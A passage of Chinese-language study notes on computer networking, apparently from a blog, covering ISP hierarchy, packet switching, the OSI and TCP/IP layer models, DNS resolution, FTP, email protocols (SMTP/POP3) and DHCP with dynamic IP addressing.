<li>第五阶段：世界上许多公司纷纷接入到互联网，网络通信急剧增大，满足不了需求。美国政府决定交给私人公司来经营，开始收费。于是，逐渐形成<strong>多层次ISP结构</strong>的互联网。1993 年开始，三级结构的互联网<code>NSFNET</code>逐渐被若干个商用的互联网主干网替代。</li>
</ul>
<h2 id="ISP（互联网服务提供商）"><a href="#ISP（互联网服务提供商）" class="headerlink" title="ISP（互联网服务提供商）"></a>ISP（互联网服务提供商）</h2><ul>
<li>中国电信，中国联通，中国移动等公司是中国最有名的 ISP。</li>
<li>ISP 可以从互联网管理机构申请到很多IP地址。<strong>主机必须有IP地址才能上网</strong>，同时还有通信线路，路由器等联网设备。缴纳费用就能能获取所需IP地址的使用权。</li>
<li>所谓上网就是通过 ISP 获得的 IP 地址接入互联网。</li>
<li>ISP 分为主干 ISP，地区 ISP，本地 ISP。<ul>
<li>主干 ISP 由专门的公司创建和维持，服务面积最大（一般能覆盖国家范围）</li>
<li>地区 ISP 是一些较小的 ISP。</li>
<li>本地 ISP 给用户提供直接的服务。本地 ISP 可以是一个仅仅提供互联网服务的公司，也可以是一个拥有网络并向自己雇员提供服务的企业，或者是大学。</li>
</ul>
</li>
<li>主机 A 和主机 B 通信的过程。主机 A –&gt; 本地 ISP –&gt; 地区 ISP –&gt; 主干 ISP –&gt; 地区 ISP –&gt; 本地 ISP –&gt; 主机 B</li>
<li>上面这种通信要经过层层阻拦，是否能绕过主干 ISP，地区 ISP 直接和地区 ISP 直接通信呢？可以的。<strong>互联网交换点 IXP</strong> 的主要作用是允许两个网络直接相连并交换分组，而不需要再通过第三个网络来转发分组。主机 A –&gt; 本地 ISP –&gt; 地区 ISP –&gt; 地区 ISP –&gt; 本地 ISP –&gt; 主机 B</li>
</ul>
<figure class="image-box">
                <img src="16e53ae0d72b8ae1.png" alt title class>
                <p></p>
            </figure>

<h2 id="互联网的组成"><a href="#互联网的组成" class="headerlink" title="互联网的组成"></a>互联网的组成</h2><ul>
<li>从工作方式可以分为两大块：边缘部分 + 核心部分。<ul>
<li>边缘部分：由所有连接在互联网上的主机组成，用户直接使用。</li>
<li>核心部分：由大量网络和连接这些网络的路由器组成。</li>
</ul>
</li>
<li>边缘部分的通信方式<ul>
<li>客户-服务器方式（C/S）。客户是服务请求方，服务器是服务提供方。</li>
<li>对等连接方式（P2P）。两台主机通信并不区分哪一个是服务请求方哪一个是提供方。只要两台主机都运行了对等连接软件就可以通信，相互下载对方硬盘里面的文档。</li>
</ul>
</li>
<li>核心部分<ul>
<li>路由器。它是一种专用计算机。路由器是实现<strong>分组交换</strong>的关键构件，其任务是转发收到的分组。</li>
</ul>
</li>
</ul>
<h3 id="何为分组交换"><a href="#何为分组交换" class="headerlink" title="何为分组交换"></a>何为分组交换</h3><ul>
<li>电路交换： 建立连接（占用通信资源） -&gt; 通话（一直占用通信资源） -&gt; 释放连接（归还通信资源）。在通话的全部时间里，通话的两个用户始终占用端到端的通信资源。</li>
<li>分组交换：采用<strong>存储转发</strong>技术。要发送整块数据，这块数据被称为一个<strong>报文</strong>。在发送之前，把报文分成一个个更小的等长数据段，并在头部加上包头。</li>
<li><strong>（首部 + 数据 = 分组）X （很多个） = 报文</strong></li>
<li>路由器的作用就是<strong>用来转发这些分组</strong>的。路由器收到一个分组，先暂存一下，检查头部，查找转发表，交给下一个路由器，一步一步以存储转发的方式给目的主机。分组交换在传输数据之前不必占用一条端到端的通信资源，并且省去了建立连接和释放连接的开销，<strong>传输数据效率更高</strong>。</li>
</ul>
<blockquote>
<p>为了理解<strong>分组</strong>，我还是更愿意称之为<strong>小报文</strong>，更方便记忆。因为称之为分组我感觉太拗口了。</p>
</blockquote>
<p>总结：</p>
<ul>
<li>电路交换。整个报文连续从源点到终点，好像在一个管道中传送。适合大量数据传输。</li>
<li>报文交换。整个报文先到达相邻结点，全部储存下来查找转发表，转发到下一个结点。</li>
<li>分组交换。单个分组（整个报文的一小部分）传送给相邻结点，存储下来后查找转发表，转发到下一个结点。（原理采用报文交换）灵活。</li>
</ul>
<h2 id="七层协议和四层协议的由来"><a href="#七层协议和四层协议的由来" class="headerlink" title="七层协议和四层协议的由来"></a>七层协议和四层协议的由来</h2><figure class="image-box">
                <img src="16e53ec3b6abd5b4.png" alt title class>
                <p></p>
            </figure>

<p>先看一个很简单的例子：连接在网络上的两台计算机要互相传送文件。  </p>
<p>要实现这种功能需要做什么呢？</p>
<ul>
<li>两者之间要有传输数据的通路。</li>
<li>要保证通道的正确发送和接收。</li>
<li>要告诉网络如何识别接收数据的计算机。</li>
<li>必须检查对方是否开机，并且联网了。</li>
<li>发起通信的计算机的软件必须搞清楚在对方的软件是否做好接收文件和存储文件的准备。</li>
<li>若计算机文件格式不兼容，则至少其中一台计算机应完成格式转换功能。</li>
<li>对于出现的各种差错意外，如数据传输错误，重复，丢失，是否有可靠的措施保障对方能接受到正确的文件。</li>
</ul>
<p>以上的种种，表明相互通信的两个计算机系统必须高度协调工作才行，为了协调，提出了分层的方法。用分层把问题分而治之。</p>
<h3 id="协议与划分层次"><a href="#协议与划分层次" class="headerlink" title="协议与划分层次"></a>协议与划分层次</h3><p>&emsp;&emsp;在计算机网络要做到有条不紊的交换数据，就必须遵守实现约好的规则。这些为进行网络中的数据交换而建立的规则，标准，约定称之为<strong>网络协议</strong>，也可简称为<strong>协议</strong>。协议有三要素。</p>
<ul>
<li>语法。数据与控制信息的结构或格式。</li>
<li>语义。即需要发出何种控制信息，完成何种动作以及做出何种响应。</li>
<li>同步。事件实现顺序的详细说明。</li>
</ul>
<p>&emsp;&emsp;<strong>我们想连接在网络上的另外一台计算机做点什么事，都需要有协议。</strong></p>
<h3 id="立贤不立长"><a href="#立贤不立长" class="headerlink" title="立贤不立长"></a>立贤不立长</h3><ul>
<li>1974 年，美国 IBM 公司宣布了<code>系统网络体系结构 SNA</code>。这个网络标准是按照分层的方法制定的。不久其他一些公司也相继推出自己公司的体系结构。</li>
<li>不同的网络体系结构出现后，使得同一个公司生产的各种设备都能很容易地互连成网。但由于<strong>网络体系结构的不同，不同公司的设备很难互相连通</strong>。</li>
<li>为了使得不同网络体系结构的用户迫切要求能够互相交换信息，国际化标准组织 ISO 在 1977 成立专门机构研究该问题。他们提出一个试图使各种计算机在世界范围内互连成网的标准框架，即 OSI/RM，<strong>简称OSI</strong>。只要遵循 OSI 标准，一个系统就可以和世界上任何地方的，也遵守这一标准的其他任何系统进行通信。</li>
<li>1983 年，OSI 提出了<strong>七层协议</strong>。</li>
<li>但是，到了 90 年代初期，尽管整套的 OSI 国际标准已经制定出来，但基于 <strong>TCP/IP 的四层协议</strong>的互联网已抢先在全球相当大的范围成功运行。OSI 失败了。</li>
<li>得到最广泛应用的不是法律上的标准 OSI，而是非国际标准 TCP/IP。<strong>TCP/IP 被当做事实的国际标准</strong>。</li>
</ul>
<blockquote>
<ul>
<li>现在人们提到的 TCP/IP 并不一定单指 TCP 和 IP 两个具体的协议，而是往往表示互联网所使用的<strong>整个 TCP/IP 协议族</strong>。</li>
<li>网络协议的一个重要的特定是必须把所有不利的条件事先估计到，不能假设一切都是正常的和非常理想的。</li>
</ul>
</blockquote>
<h3 id="四层协议"><a href="#四层协议" class="headerlink" title="四层协议"></a>四层协议</h3><ul>
<li>应用层。是体系结构的最高层。任务是通过应用进程间的交互来完成特定网络应用。应用层定义的是应用进程间通信和交互的规则。在互联网的应用层协议很多，如<code>域名系统 NDS</code>，<code>支持万维网应用的 HTTP 协议</code>，<code>支持电子邮件的 SMTP 协议</code>。我们把应用层交互的数据单元称为报文。</li>
<li>运输层。负责两台主机中进程之间的通信提供通用的数据传输服务。主要使用两种协议。<ul>
<li><code>传输控制协议 TCP</code>。数据传输的单位是报文段。</li>
<li><code>用户数据报协议 UDP</code>。提供无连接的，尽最大努力的数据传输服务（不保证数据传输的可靠性），数据传输的单位是用户数据报。</li>
</ul>
</li>
<li>网络层。负责为分组交换网上的不同主机提供通信服务。在发送数据时，网络层把运输层产生的报文段或用户数据封装成分组（小报文）或包进行传送。网络层的另外一个任务就是要选择合适的路由，使源主机运输层所传下来的分组（小报文）能够通过路由器找到目的的主机。<code>IP 协议</code>。</li>
<li>数据链路层（链路层）。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要专门的链路层协议。在两个相邻结点之间传送数据时，数据链路层把网络层交下来的IP数据报组装成帧，<strong>在两个相邻结点的链路上传送帧，每一帧包括数据和必要的控制信息（如同步信息，地址信息，差错控制）</strong>。在接收数据时，接收到一个帧，抽出数据部分，提交给网络层。</li>
</ul>
<h2 id="捋一捋两个主机之间通信的全过程"><a href="#捋一捋两个主机之间通信的全过程" class="headerlink" title="捋一捋两个主机之间通信的全过程"></a>捋一捋两个主机之间通信的全过程</h2><p>主机 A 向主机 B 传输数据：</p>
<ol>
<li>主机 A 把数据给应用层，应用层加上必要的控制信息。</li>
<li>应用层的数据再给运输层，运输层再加上控制信息。</li>
<li>运输层的数据给网络层，网络层再加上控制信息。</li>
<li>网络层的数据给链路层，链路层给数据加上首部和尾部。</li>
<li>链路层再把数据给物理层，物理层传输单位是比特，不加控制信息。</li>
<li>接着数据到达路由器，路由器分析控制信息。</li>
<li>路由器的分组（小报文）传给物理层。</li>
<li>物理层再传给链路层，链路层分析控制信息并剥去，找到上层的网络层。</li>
<li>网络层接收到数据，分析控制信息并剥去，找到上层的运输层。</li>
<li>运输层接收到信息，分析并剥去控制信息，找到应用层。</li>
<li>应用层剥去控制信息，把数据给主机 B。</li>
</ol>
<p><strong>用一个简单的例子描述：</strong><br>&emsp;&emsp;一封信从最高层向下传，每经过一层就包上一个新的信封，写上必要的地址信息。到达最底层时，向上传，每经过一层就剥去一层信封，到达最高层的时候，去取出发信人的信交给收信人就可以了。</p>
<hr>
<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;本篇文章主要分享应用层下面的几个协议：DNS 域名解析；FTP 文件传输协议；DHCP 动态主机配置协议；电子邮件的 SMTP，POP3 协议。</p>
<h2 id="应用层-1"><a href="#应用层-1" class="headerlink" title="应用层"></a>应用层</h2><p>&emsp;&emsp;每个应用层协议都是为了解决<strong>某一类应用</strong>问题，而问题的解决又必须通过位于不同主机中的多个应用进程之间的<strong>通信和协同</strong>工作来完成。应用层的具体内容就是精确定义这些通信规则。具体来说，应用层协议应当定义：</p>
<ul>
<li>应用进程交换的报文类型，如请求报文和响应报文。</li>
<li>各种报文类型的语法，如报文中的各个字段以及详细描述。</li>
<li>字段的语义，即包含在字段中的信息的含义。</li>
<li>进程何时，如何发送报文，以及对报文进行响应的规则。</li>
</ul>
<h2 id="域名系统-DNS"><a href="#域名系统-DNS" class="headerlink" title="域名系统 DNS"></a>域名系统 DNS</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="何为-DNS？"><a href="#何为-DNS？" class="headerlink" title="何为 DNS？"></a>何为 DNS？</h4><p>&emsp;&emsp;域名系统 DNS 是互联网使用的<strong>命名系统</strong>，用来把便于人们使用的机器名字装换为 IP 地址。域名系统就是名字系统。为什么不叫“名字”而叫“域名”呢？是因为在这种互联网的命名系统中使用了许多的“域”。</p>
<h4 id="为什么用户要用域名来访问？"><a href="#为什么用户要用域名来访问？" class="headerlink" title="为什么用户要用域名来访问？"></a>为什么用户要用域名来访问？</h4><p>&emsp;&emsp;用户与互联网上某台主机通信时，<strong>必须知道对方的 IP 地址</strong>。然而用户很难记住长达 32 位的二进制主机地址。域名系统 DNS 能够把互联网上的主机名字转换为 IP 地址。</p>
<h4 id="为什么机器在处理-IP-数据报时要使用-IP-地址而不使用域名呢？"><a href="#为什么机器在处理-IP-数据报时要使用-IP-地址而不使用域名呢？" class="headerlink" title="为什么机器在处理 IP 数据报时要使用 IP 地址而不使用域名呢？"></a>为什么机器在处理 IP 数据报时要使用 IP 地址而不使用域名呢？</h4><p>&emsp;&emsp;因为IP地址的长度是固定 32 位的（如果是 IPv6，就是 128 位），但是域名却不是固定的，机器处理起来很难。</p>
<h4 id="DNS-的结构"><a href="#DNS-的结构" class="headerlink" title="DNS 的结构"></a>DNS 的结构</h4><p>&emsp;&emsp;互联网采用<strong>层次树状结构</strong>的命名方法，并使用<strong>分布式</strong>的域名系统 DNS。<br>&emsp;&emsp;互联网的域名系统 DNS 被设计成为一个联机分布式数据库系统，并采用客户服务器方式。DNS 让大多数名字都在本地进行解析，仅少量解析需要在互联网上通信，因此 DNS 系统<strong>效率</strong>很高。由于 DNS 是分布式系统，即便单个计算机出了故障，也不会妨碍整个 DNS 系统正常运行。<br>&emsp;&emsp;域名到 IP 地址的解析是由分布在互联网上的许多域名服务器程序共同完成的。域名服务器程序在专设的结点上运行，而人们也常把运行域名服务器程序的机器称为<strong>域名服务器</strong>。</p>
<h4 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h4><p>&emsp;&emsp;过程如下：当一个应用程序需要把主机名解析为 IP 地址时，该应用进程就调用解析程序，并成为 DNS 的一个客户，把待解析的域名放在 DNS 请求报文中，以 UDP 用户数据报方式发给本地域名解析器，本地域名服务器查找后，就返回对应的 IP 地址。应用进程获得目的的 IP 地址后即可进行通信。若本地域名服务器无法解析，就向上一层的域名服务器上查找，直到找到。</p>
<h3 id="域名结构"><a href="#域名结构" class="headerlink" title="域名结构"></a>域名结构</h3><p>&emsp;&emsp;早期因为用户数少，用了非等级的名字空间。但是随着用户急剧增加，采用了层次树状结构的命名方法。<br>&emsp;&emsp;<code>mail.cctv.com</code>中 com 为顶级域名，cctv 为二级域名，mail 为三级域名。级别最低的写在最左边，而级别最高的顶级域名写在最右边。<br>&emsp;&emsp;DNS 既不规定一个域名需要包含多少个下级域名，也不规定每一级的域名代表什么意思。各级域名由其上一级的域名管理机构管理，最顶级的域名由 ICANN 进行管理。用这种方法可以使每个域名在整个互联网范围内是唯一的，并且容易设计出一种查找域名的机制。</p>
<ul>
<li>通用顶级域名：<code>com</code>（公司企业）、<code>net</code>（网络服务机构）、<code>org</code>（非营利性组织）、<code>int</code>（国际组织）、<code>edu</code>（美国专用教育机构）、<code>gov</code>（美国政府机构）、<code>mil</code>（美国军事机构）等等共有 20 个。</li>
<li>国家顶级域名：<code>cn</code>（中国）、<code>us</code>（美国）等等</li>
<li>反向域名：<code>arpa</code>，用于反向解析</li>
</ul>
<figure class="image-box">
                <img src="16ebf64cef01ada5.png" alt title class>
                <p></p>
            </figure>

<h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>&emsp;&emsp;理论上，可以让每一级的域名都都有一个相对应的域名服务器，但是这样会造成服务器数量过多，效率降低。所以采用划分区的方法来解决这个问题。<br>&emsp;&emsp;一个服务器所负责管辖的范围叫做区。每个区设置相对应的<strong>权限域名服务器</strong>，用来<strong>保存该区所有域名到 IP 地址的映射</strong>。<br>&emsp;&emsp;DNS 服务器的管辖范围不是以域为单位，而是以区为单位。区是服务器实际管辖的范围，区可能等于或小于域，但一定不能大于域。一个域下面可能会有一个或多个区。</p>
<h4 id="域名服务器的分类"><a href="#域名服务器的分类" class="headerlink" title="域名服务器的分类"></a>域名服务器的分类</h4><ul>
<li>根域名服务器。最高层次，最重要的域名服务器。</li>
<li>顶级域名服务器。诸如 com cn gov 这种的。</li>
<li>权限域名服务器。负责一个区的域名服务器。</li>
<li>本地域名服务器。当一台主机发出 DNS 查询请求，这个查询请求报文就发送给本地域名服务器。每个 ISP，或一个大学都可以拥有一个本地域名服务器。本地域名服务器离用户较近，一般不超过几个路由器的距离。当所要查询的主机也同属于同一个 ISP 时，该本地域名服务器立即就能把要查询的主机名转换为它的 IP 地址，而不需要去询问其他的域名服务器。</li>
</ul>
<h4 id="辅助域名服务器"><a href="#辅助域名服务器" class="headerlink" title="辅助域名服务器"></a>辅助域名服务器</h4><p>&emsp;&emsp;为了提高域名服务器的可靠性，DNS 域名服务器都把数据复制到几个域名服务器来保存，其中<strong>一个是主域名服务器，其他的是辅助域名服务器</strong>。当主域名服服务器出现故障，辅助域名服务器可以确保工作不会中段。</p>
<h3 id="域名查询的两种方式"><a href="#域名查询的两种方式" class="headerlink" title="域名查询的两种方式"></a>域名查询的两种方式</h3><ul>
<li>递归查询<br>&emsp;&emsp;假如主机 A 想访问主机 B。主机 A 输入 B 的域名后，先是到本地域名服务器查询，查询不到，本地域名服务器以 DNS 客户的身份代表主机 A 去访问根域名服务器，若还是查询不到，根域名服务器如法炮制去到下面一级的顶级域名服务器查询，直到拿到主机 B 的 IP 地址。然后原路返回，给主机 A。</li>
<li>迭代查询<br>&emsp;&emsp;当根域名服务器收到本地域名服务器发出的请求报文时，要么给出 IP 地址，要么告诉本地域名服务器“下一步应该向哪一个域名服务器进行查询”，直到有域名服务器给出 IP 地址。</li>
</ul>
<p>&emsp;&emsp;<strong>注意：主机向本地域名服务器查询一般采用递归查询。本地域名服务器向根域名服务器查询通常采用迭代查询。</strong></p>
<h3 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h3><ul>
<li>为了提高 DNS 查询效率，并减轻根域名服务器的负荷和减少互联网上的 DNS 查询报文数量，在<strong>域名系统服务器</strong>中广泛使用了高速缓存。高速缓存用来存放<strong>最近查询过的域名</strong>以及从何处获得域名映射信息的记录。</li>
<li>许多主机在启动时从本地域名服务器下载名字和地址的全部数据库，维护存放自己最近使用的域名的高速缓存，并且在缓存中找不到名字时才使用域名服务器。</li>
</ul>
<h3 id="总结-DNS-解析全过程"><a href="#总结-DNS-解析全过程" class="headerlink" title="总结 DNS 解析全过程"></a>总结 DNS 解析全过程</h3><ol>
<li>浏览器输入一个地址，按下回车。</li>
<li>如果地址的信息未写完整，（完整的格式应该是这样：<code>www.baidu.com:8080</code>），那么现在的浏览器会自动帮你补齐协议号和端口号。</li>
<li>浏览器得到完整地址会开始解析，获取改地址的协议，各级域名，端口，路径。</li>
<li>比对存储在本地的<strong>高速缓存</strong>，如果有，就直接得到 IP 地址了。</li>
<li>如果没有，则向<strong>本地域名服务器</strong>发出查询请求。（递归查询）</li>
<li>如果本地域名服务器没有，那么本地域名服务器会直接向<strong>根域名服务器</strong>（最顶层）发出查询请求。此时，根域名服务器要么给出 IP 地址，要么告诉本地域名服务器“下一步应该向哪一个域名服务器进行查询”，直到给出 IP 地址。（迭代查询）</li>
</ol>
<h2 id="文件传输协议-FTP"><a href="#文件传输协议-FTP" class="headerlink" title="文件传输协议 FTP"></a>文件传输协议 FTP</h2><p>文件传送协议 FTP 是互联网上使用最广泛的文件传送协议。</p>
<ul>
<li>FTP 提供交互式的访问</li>
<li>允许客户指明文件的类型与格式</li>
<li>允许文件具有存取权限（访问文件的用户必须经过授权，并输入有效的口令）</li>
<li>FTP 屏蔽了个各计算机系统的系统的细节，因而适合于在异构网络中任意计算机之间传送文件。</li>
</ul>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
<li>基于 TCP 的 FTP 和基于 UDP 的简单文件传送协议 TFTP，它们都是文件共享协议中的一大类，即<strong>复制整个文件</strong>。若要存取一个文件，就必须先获得一个本地的文件副本。如果要修改文件只能对文件的副本进行修改，然后再将修改后的文件副本传回到原节点。</li>
<li>联机访问。允许多个程序同时对一个文件进行存取。</li>
</ul>
<h3 id="FTP-基本工作原理"><a href="#FTP-基本工作原理" class="headerlink" title="FTP 基本工作原理"></a>FTP 基本工作原理</h3><p>&emsp;&emsp;<strong>两台主机之间传送文件看似是很简单，往往十分困难。</strong><br>&emsp;&emsp;原因是众多的计算机厂商研制出的文件系统多达数百种，且差别很大。  </p>
<p>经常遇到的问题是：</p>
<ol>
<li>计算机存储数据的格式不同。</li>
<li>文件的目录结构和文件命名的规定不同。</li>
<li>对于相同的文件存取功能，操作系统使用的命令不同。</li>
<li>访问控制方法不同。</li>
</ol>
<p>&emsp;&emsp;文件传送协议 FTP 只提供文件传送的一些基本的服务，主要功能是<strong>减少或消除在不同操作系统下处理文件的不兼容性</strong>。  </p>
<p>&emsp;&emsp;FTP 协议分客户端和服务端。一个 FTP 服务端可以为多个客户端提供服务。  </p>
<p>&emsp;&emsp;服务端分两类：主进程，从属进程。主进程负责接受新请求，若干个从属进程负责处理单个进程。  </p>
<p>&emsp;&emsp;客户端和服务端都有两个从属进程：<strong>控制进程</strong>和<strong>数据传送进程</strong>。<br>&emsp;&emsp;控制连接会在整个会话期间一直保持打开。<br>&emsp;&emsp;数据连接用来传输文件，传输完成就关闭数据传送连接。</p>
<h4 id="FTP-文件传输过程总结"><a href="#FTP-文件传输过程总结" class="headerlink" title="FTP 文件传输过程总结"></a>FTP 文件传输过程总结</h4><ul>
<li>客户端发送请求，服务端提供文件。</li>
<li>客户端和服务端都有两个从属进程：<strong>控制进程</strong>和<strong>数据传送进程</strong>。</li>
<li>控制进程会在整个会话期间一直保持打开，表示一直在连接，有点像电路交换。</li>
<li>数据连接用来传输文件，传输完成就关闭数据传送连接。</li>
</ul>
<h3 id="TFTP-简单文件传送协议"><a href="#TFTP-简单文件传送协议" class="headerlink" title="TFTP 简单文件传送协议"></a>TFTP 简单文件传送协议</h3><p>&emsp;&emsp;它是一个很小且易于实现的文件传送协议。<br>&emsp;&emsp;<strong>优点：使用 UDP 数据报。TFTP 代码所占的内存较小。</strong>  </p>
<p>&emsp;&emsp;TFTP 只支持文件传输而不支持交互。<br>&emsp;&emsp;发的一方：发完数据后在规定时间内收不到确认就要重复发送数据 PDU。</p>
<h3 id="FTP-下载文件（通过浏览器方式）"><a href="#FTP-下载文件（通过浏览器方式）" class="headerlink" title="FTP 下载文件（通过浏览器方式）"></a>FTP 下载文件（通过浏览器方式）</h3><ol>
<li>输入地址：协议 + 主机号。所以是<code>ftp://127.0.0.1</code>这种形式的。</li>
<li>接着会让你登录自己主机的用户名和密码。</li>
<li>接着进入 FTP 服务器，选择要下载的文件，保存就可以了。</li>
<li>用 FTP 协议下载文件时，自己的浏览器要打开（FTP 客户端），同时 FTP 服务端也会打开让客户端去下载。</li>
</ol>
<h2 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>&emsp;&emsp;1982 年，ARPANET 的电子邮件问世。<br>&emsp;&emsp;电子邮件最重要的两个标准是：<strong>简单邮件传送协议 SMTP</strong> 和<strong>互联网文本报文格式 [RFC 5322]</strong>。<br>&emsp;&emsp;由于互联网的 SMTP 只能传送可打印的 7 位 ASCII 码邮件，因此 1993 年提出<strong>通用互联网邮件扩充 MIME</strong>。MIME 在邮件首部中说明了邮件的数据类型（文本，声音，图像等）。在 MIME 邮件中可同时传送多种类型的数据。</p>
<h3 id="电子邮件系统构成"><a href="#电子邮件系统构成" class="headerlink" title="电子邮件系统构成"></a>电子邮件系统构成</h3><p>&emsp;&emsp;一个电子邮件系统应由三个主要组成构建：用户代理，邮件服务器，邮件发送协议和邮件读取协议（如 POP3）。</p>
<figure class="image-box">
                <img src="16ebf94a88e8c17a.jpg" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;发件人用户代理（SMTP 客户） -&gt; 发送邮件 SMTP -&gt; 发送方邮件服务器（SMTP 服务器，SMTP 客户） -&gt; 发送邮件 SMTP -&gt; 接收方邮件服务器（SMTP 服务器，POP3 服务器） -&gt; 读取邮件 POP3 -&gt; 收件人用户代理（POP3 客户）</p>
</blockquote>
<h4 id="用户代理"><a href="#用户代理" class="headerlink" title="用户代理"></a>用户代理</h4><p>&emsp;&emsp;用户代理 UA 就是用户与电子邮件系统的接口，在大多数情况下它就是运行在用户电脑中的<strong>一个程序</strong>。因此用户代理又称为电子邮件客户端软件。用户代理提供一个很友好的接口（主要是窗口界面）来发送和接收邮件。微软的 <strong>outlook</strong> 和 张小龙的 <strong>Foxmail</strong> 都是很受欢迎的电子邮件用户代理。</p>
<h4 id="邮件服务器"><a href="#邮件服务器" class="headerlink" title="邮件服务器"></a>邮件服务器</h4><p>&emsp;&emsp;互联网上有许多邮箱服务器可供用户选择。邮件服务器 24 小时不间断的工作，并且具有很大容量的邮件信箱。<br>&emsp;&emsp;邮件服务器的功能是发送和接收邮件，同时还要向发件人报告邮件传送的结果（已发送，已拒绝，丢失等）。<br>&emsp;&emsp;邮件服务器需使用两种不同的协议：SMTP 用于传送邮件；POP3 用于用户代理从邮件服务器读取邮件。<br>&emsp;&emsp;邮件服务器即是客户端，也是服务器。A 服务器向 B 服务器发送邮件，A 就是 SMTP 客户，B 是 SMTP 服务器；反之亦然。<br>&emsp;&emsp;TCP/IP 体系的电子邮箱系统规定电子邮箱地址的格式如下：<code>用户名 @ 邮件服务器的域名</code>。</p>
<h4 id="SMTP-简单邮件传送协议"><a href="#SMTP-简单邮件传送协议" class="headerlink" title="SMTP 简单邮件传送协议"></a>SMTP 简单邮件传送协议</h4><p>&emsp;&emsp;SMTP 规定了在两个相互通信的SMTP进程之间应如何交换信息。至于邮件内容格式，邮件如何存储，以及邮件系统应以多快的速度来发送邮件，SMTP 未做规定。<strong>SMTP 通信三个阶段：建立连接 -&gt; 邮件传送 -&gt; 连接释放。</strong>具体内容就不展开了。</p>
<h4 id="POP3-邮件读取协议"><a href="#POP3-邮件读取协议" class="headerlink" title="POP3 邮件读取协议"></a>POP3 邮件读取协议</h4><p>&emsp;&emsp;邮局协议 POP 是一个非常简单，但功能有限的邮件读取协议，经过几次更新，现在使用的是 1996 年版本 POP3，它已经成为互联网的正式标准。另外一个邮件读取协议是 IMAP。</p>
<blockquote>
<p>&emsp;&emsp;<strong>最后在强调一下，不要把邮件读取协议 POP3 或 IMAP 与邮件传输协议 SMTP 弄混。发件人的用户代理向发送方邮件服务器发送邮件，以及发送方邮件服务器向接收方邮件服务器发送邮件，都是使用 SMTP 协议。只有用户代理从接收方邮件服务器上读取邮件才使用 POP3。</strong></p>
</blockquote>
<h2 id="动态主机配置协议-DHCP"><a href="#动态主机配置协议-DHCP" class="headerlink" title="动态主机配置协议 DHCP"></a>动态主机配置协议 DHCP</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>连接到互联网的计算机的协议软件需要配置的项目包括：</p>
<ul>
<li>IP 地址</li>
<li>子网掩码</li>
<li>默认路由器的 IP 地址</li>
<li>域名服务器的 IP 地址</li>
</ul>
<p>&emsp;&emsp;为了省去给计算机配置 IP 地址的麻烦，能否在计算机的生产过程中，事先给一台计算机配置好一个唯一的 IP 地址（如同每一个以太网适配器拥有一个唯一的硬件的地址）。</p>
<blockquote>
<p>为什么上个网要这么麻烦？能不被一次性配置好然后永远都可以上网了。</p>
</blockquote>
<p>&emsp;&emsp;<strong>这显然是不行的。这是因为 IP 地址不仅包括了主机号，而且还包括了网络号。</strong><br>&emsp;&emsp;一个 IP 地址指出了一台计算机连接在哪一个网络上。当计算机还在生产时，无法知道它在出厂后将被连接在哪一个网络上。因此，需要连接到互联网的计算机，必须对 IP 地址等项目进行协议配置。</p>
<blockquote>
<p>可以人工配置吗？</p>
</blockquote>
<p>&emsp;&emsp;用人工进行配置很不方便，且容易出错。</p>
<h3 id="动态-IP"><a href="#动态-IP" class="headerlink" title="动态 IP"></a>动态 IP</h3><p>&emsp;&emsp;动态 IP 指的是在需要的时候才进行 IP 地址分配的方式。所谓动态就是指当你每一次上网时，电信会随机分配一个 IP 地址。<br>&emsp;&emsp;由于 IP 地址资源很宝贵，因此大部分用户上网都是使用动态 IP 地址的，比如通过 Modem、ISDN、ADSL、有线宽频、小区宽频等方式上网的计算机，都是在每次上网的时候临时分配一个 IP 地址。<br>&emsp;&emsp;IP 地址是一个 32 位二进制数的地址，理论上讲，有大约 40 亿（2 的 32 次方）个可能的地址组合，这似乎是一个很大的地址空间。实际上，根据网络 ID 和主机 ID 的不同位数规则，可以将 IP 地址分为 A （7 位网络 ID 和 24 位主机 ID）、B （14 位网络 ID 和 16 位主机 ID）、C （21 位网络 ID 和 8 位主机 ID）三类，由于历史原因和技术发展的差异，A 类地址和 B 类地址几乎分配殆尽，能够供全球各国各组织分配的只有 C 类地址。所以说 IP 地址是一种非常重要的网络资源。<br>&emsp;&emsp;对于一个设立了因特网服务的组织机构，由于其主机对外开放了诸如 <strong>WWW 、FTP 、E-mail 等访问服务，通常要对外公布一个固定的 IP 地址，以方便用户访问</strong>。当然，数字 IP 不便记忆和识别，人们更习惯于通过域名来访问主机，而域名实际上仍然需要被域名服务器（DNS）翻译为 IP 地址。例如，你的主页地址，用户可以方便地记忆和使用，而域名服务器会将这个域名翻译为<code>101.12.123.234</code>，这才是你在网上的真正地址。<br>&emsp;&emsp;而对于大多数拨号上网的用户，由于其上网时间和空间的离散性，为每个用户分配一个固定的 IP 地址（静态 IP）是非常不可取的，这将造成 IP 地址资源的极大浪费。因此这些用户通常会在每次拨通 ISP 的主机后，自动获得一个动态的 IP 地址，该地址当然不是任意的，而是该 ISP 申请的网络 ID 和主机 ID 的合法区间中的某个地址。拨号用户任意两次连接时的 IP 地址很可能不同，但是在每次连接时间内 IP 地址不变。</p>
